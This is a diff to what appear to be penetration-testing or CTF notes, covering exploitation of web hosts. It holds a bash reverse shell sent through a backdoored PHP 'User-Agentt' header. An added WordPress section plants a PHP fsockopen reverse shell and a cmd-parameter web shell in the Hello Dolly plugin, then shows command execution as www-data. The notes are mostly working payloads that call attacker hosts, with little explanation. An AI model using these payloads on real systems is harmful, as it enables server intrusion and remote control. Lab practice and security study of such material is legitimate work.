@@ -393,3 +393,20 @@ User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/10.10.14.13/9001 0>&1"
 ```
  /opt/ona/www/local/config/database_settings.inc.php
 ```
+
+### Wordpress HelloDolly Plugin&#x20;
+
+<pre><code>https://yebberdog.medium.com/try-hack-me-jack-walkthrough-904035594dc2
+<strong>- craft shell from hacktricks 
+</strong>- from revshells.com
+&#x3C;?php $sock=fsockopen("10.10.14.2",80);passthru("/bin/bash &#x3C;&#x26;3 >&#x26;3 2>&#x26;3"); ?>
+- update dolly code 
+File edited successfully.
+- now activate it 
+
+&#x3C;?php if(isset($_REQUEST["cmd"])){ echo "&#x3C;pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "&#x3C;/pre>"; die; }?>
+
+http://10.10.110.100:65000/wordpress/wp-content/plugins/hello.php?cmd=id
+- code execution...
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
